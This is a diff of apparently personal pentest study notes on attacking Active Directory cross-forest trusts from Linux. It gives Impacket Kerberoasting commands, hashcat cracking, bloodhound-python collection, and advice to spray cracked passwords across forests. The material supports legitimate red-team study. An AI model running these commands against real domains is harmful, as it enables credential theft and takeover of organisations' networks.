@@ -1,78 +1,50 @@
-## Cross-Forest Kerberoasting
+# Attacking Domain Trusts — Cross-Forest Trust Abuse (Linux)
 
-Credentials permit authentication into a trusted domain and SPNs exist for service accounts in that target forest.
-
-List available SPNs in the target domain to identify high-value targets:
-
-```
-GetUserSPNs.py -target-domain <TARGET_DOMAIN> <DOMAIN>/<USERNAME>
-```
-
-Request TGS tickets for offline cracking and save to a file:
-
-```
-GetUserSPNs.py -request -target-domain <TARGET_DOMAIN> -outputfile <FILE_PATH> <DOMAIN>/<USERNAME>
-```
-
-Attempt offline recovery of the service account password:
-
-```
-hashcat -m 13100 <FILE_PATH> <WORDLIST_PATH>
-```
-
-- **Dangerous / misconfigured settings**
-    
-    - Privileged accounts (e.g., Domain Admins) assigned SPNs.
-    - Service account password re-use across different domains.
-- **Gotchas**
-    
-    - **Authentication failure** occurs if the provided credentials do not have rights to authenticate across the forest trust.
-    - **Empty results** if you fail to specify the `-target-domain` flag when targeting the trusted forest.
+Same attacks as the Windows section, Impacket tooling instead.
 
 ---
 
-## DNS Configuration for Remote Enumeration
+## Cross-Forest Kerberoasting
 
-The attack host is not configured with internal DNS and tools require a DC hostname instead of an IP address.
+Enumerate SPN accounts in the trusted forest — check `MemberOf` immediately:
 
-Update the local resolver to point to the target domain controller:
-
-```
-sudo nano /etc/resolv.conf
+```bash
+GetUserSPNs.py -target-domain <TARGET_FOREST> <YOUR_DOMAIN>/<USER>
 ```
 
-Configure the target domain and nameserver:
+Pull the TGS ticket:
+
+```bash
+GetUserSPNs.py -request -target-domain <TARGET_FOREST> <YOUR_DOMAIN>/<USER> -outputfile <OUTFILE>
+```
+
+Crack with hashcat mode 13100. DA in target forest → after cracking, spray that password in your current domain too — same admins often reuse across forests.
+
+---
+
+## Foreign Group Membership — bloodhound-python
+
+Collect from both forests separately. For each, update `/etc/resolv.conf` to point at that forest's DC:
 
 ```
-domain <DOMAIN>
+domain <FOREST_FQDN>
 nameserver <DC_IP>
 ```
 
-> ⚠️ Gap: Manual edits to `/etc/resolv.conf` are **volatile** and frequently overwritten by DHCP or systemd-resolved, potentially breaking resolution mid-enumeration.
+Run collection:
 
----
-
-## Cross-Forest Group Enumeration
-
-Bidirectional forest trusts exist and you need to map foreign domain group memberships or administrative relationships.
-
-Collect BloodHound data from a target domain using cross-domain credentials:
-
-```
-bloodhound-python -d <TARGET_DOMAIN> -dc <DC_HOSTNAME> -c All -u <USERNAME>@<DOMAIN> -p <PASSWORD>
+```bash
+bloodhound-python -d <FOREST_FQDN> -dc <DC_FQDN> -c All -u <USER>@<YOUR_DOMAIN> -p <PASS>
 ```
 
-Consolidate JSON output for GUI ingestion:
+Zip per forest and upload both to BloodHound GUI:
 
-```
-zip -r <FILE_PATH>.zip *.json
+```bash
+zip -r <OUTFILE>.zip *.json
 ```
 
-- **Dangerous / misconfigured settings**
-    
-    - Foreign forest principals added to Domain Local Groups.
-    - Bidirectional trusts allowing cross-forest administrative access.
-- **Gotchas**
-    
-    - **Tool failure** occurs if the DC hostname cannot be resolved via DNS before execution.
-    - **Incomplete data** if only one side of the trust is enumerated; both domains must be ingested to see foreign membership links.
+BloodHound query after uploading both datasets: **Users with Foreign Domain Group Membership** → select source domain → see any accounts with privileged group membership in the other forest.
+
+> [!tip] If your domain's Administrator shows up as a member of the target forest's `Administrators` group, you already own both forests — no further attack needed. Verify with `Enter-PSSession` or CME.
+
+> [!tip] Always cross-check cracked cross-forest SPN passwords against accounts in your current domain. If the same admin team manages both environments, password reuse is high probability.
